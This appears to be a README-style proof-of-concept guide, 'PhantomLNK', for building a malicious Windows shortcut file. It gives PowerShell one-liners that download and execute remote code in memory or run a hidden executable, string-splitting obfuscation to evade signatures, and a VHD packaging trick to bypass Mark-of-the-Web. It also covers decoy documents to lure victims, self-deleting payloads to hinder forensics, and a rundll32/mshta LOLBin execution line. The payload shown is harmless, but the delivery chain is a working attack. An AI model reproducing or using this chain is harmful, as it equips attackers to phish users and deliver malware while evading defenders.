# PhantomLNK

This method minimizes detection risks, reduces "noise," and leverages modern living-off-the-land (LOL) techniques to mimic real-world attacks while keeping the payload harmless.

---

### **Improved PoC Workflow**  
**Objective**: Craft a `.lnk` file that:  
1. **Covertly downloads** a payload (no ZIP extraction).  
2. **Executes** it silently (no visible windows).  
3. **Self-destructs** to evade forensics.  

---

### **Step 1: Create a Minimal Payload**  
Compile `hello.exe` (as before) or use a lightweight scripting language like **VBScript**:  
```vbs
' hello.vbs  
MsgBox "Hello from a stealthy PoC!", vbInformation, "Legit App"  
```  
Host `hello.exe` or `hello.vbs` on a **HTTPS-enabled server** (e.g., GitHub Pages, AWS S3) to avoid HTTP scrutiny.  

---

### **Step 2: Craft the .lnk File**  
Use **PowerShell + COM Objects** for stealth:  
```powershell
# Target command for the .lnk file (one-liner):  
powershell -w hidden -c "$d=(New-Object Net.WebClient).DownloadString('https://RAW_GITHUB_URL/hello.vbs'); iex $d"  
```  
**Why this is better**:  
- Uses `Net.WebClient` (less logged than `Invoke-WebRequest`).  
- Directly executes code in memory (no disk writes for the script).  
- HTTPS hides traffic from basic network scans.  

---

### **Step 3: Obfuscate the Command**  
Break down the command to evade signature-based detection:  
```powershell
# Split strings and use aliases (e.g., `iex` = `Invoke-Expression`):  
powershell -w 1 -c "&('i'+'ex') (New-Object Net.WebClient).DownloadString('ht'+'tps://RAW_GITHUB_URL/hello.vbs')"  
```  

---

### **Step 4: Bypass Mark-of-the-Web (MotW)**  
To avoid security warnings when the `.lnk` is downloaded:  
1. **Host the .lnk in a VHD file**:  
   - Mount a **VHD** (Virtual Hard Disk) in your VM.  
   - Place the `.lnk` inside the VHD.  
   - When the VHD is mounted, Windows treats the `.lnk` as a "local file," bypassing MotW.  

```powershell
# Create a VHD (Windows VM):  
New-VHD -Path "C:\malicious.vhd" -SizeBytes 50MB -Dynamic  
Mount-VHD -Path "C:\malicious.vhd"  
Initialize-Disk -Number 1 -PartitionStyle MBR  
New-Partition -DiskNumber 1 -UseMaximumSize  
Format-Volume -DriveLetter X -FileSystem NTFS  
# Copy the .lnk to X:\ and unmount  
```  

---

### **Step 5: Simulate a Real-World Attack**  
1. **Add a decoy document**:  
   - Include a harmless PDF or DOCX in the VHD to trick the user into opening the `.lnk`.  
2. **Use environmental variables** for paths:  
   - Example: `%APPDATA%\Microsoft\Windows\Recent\` (masquerades as a recent document).  

---

### **Step 6: Execute Silently**  
For `.exe` payloads, use **WMI** (Windows Management Instrumentation) to run the process with no visible window:  
```powershell
# Embedded in the .lnk:  
powershell -w hidden -c "(New-Object Net.WebClient).DownloadFile('https://payload.url/hello.exe','%TEMP%\hello.exe'); Start-Process -WindowStyle Hidden '%TEMP%\hello.exe'"  
```  

---

### **Step 7: Cleanup Traces**  
Modify the payload to delete itself after execution:  
```vbs  
' hello.vbs  
MsgBox "Hello World!", vbInformation, "Test"  
CreateObject("WScript.Shell").Run "cmd /c del %TEMP%\hello.vbs", 0, True  
```  

---

### **Detection Evasion Tips**  
1. **Use trusted domains**: Host payloads on compromised-but-benign services (e.g., GitHub Gist, Google Drive).  
2. **LOLBins**: Leverage legitimate tools like `mshta`, `rundll32`, or `regsvr32` to execute code.  
   Example:  
   ```powershell
   rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -c ...")  
   ```  

---

### **Why This is More Efficient/Secure**  
- **No disk writes**: Execute code directly in memory (e.g., VBS/PowerShell scripts).  
- **HTTPS**: Avoids unencrypted traffic flags.  
- **Minimal footprint**: No extraction, fewer process spawns.  
- **LOLBin abuse**: Uses trusted Windows tools to blend in.  

---

### **Demo in a VM**  
1. Host `hello.vbs` on a raw GitHub URL.  
2. Create the `.lnk` with the obfuscated PowerShell command.  
3. Package the `.lnk` in a VHD with a decoy PDF.  
4. Mount the VHD in the VM and click the `.lnk`.  
5. The VBS runs silently and displays a harmless message.  

